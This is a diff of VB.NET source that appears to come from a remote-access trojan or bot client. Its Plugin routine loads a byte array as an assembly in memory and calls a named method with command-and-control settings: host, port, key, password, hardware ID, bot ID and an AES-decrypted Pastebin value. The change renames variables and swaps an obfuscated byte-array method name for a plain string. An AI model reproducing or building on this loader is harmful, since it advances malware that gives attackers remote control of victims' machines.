@@ -79,10 +79,10 @@
 
         Public Shared Sub Plugin(ByVal B() As Byte)
             Try
-                For Each A As Type In AppDomain.CurrentDomain.Load(B).GetTypes
-                    For Each MF In A.GetMethods
-                        If MF.Name = BS(New Byte() {82, 67}) Then 'RC
-                            MF.Invoke(Nothing, New Object() {C_Settings.HOST, C_Settings.PORT, C_Socket.KEY, C_Socket.SPL, C_Settings.PASS, C_Settings.fullpath, C_ID.HWID, C_ID.Bot, C_Encryption.AES_Decrypt(C_Settings.Pastebin)})
+                For Each Type_ As Type In AppDomain.CurrentDomain.Load(B).GetTypes
+                    For Each GM In Type_.GetMethods
+                        If GM.Name = "CN" Then
+                            GM.Invoke(Nothing, New Object() {C_Settings.HOST, C_Settings.PORT, C_Socket.KEY, C_Socket.SPL, C_Settings.PASS, C_Settings.fullpath, C_ID.HWID, C_ID.Bot, C_Encryption.AES_Decrypt(C_Settings.Pastebin)})
                         End If
                     Next
                 Next
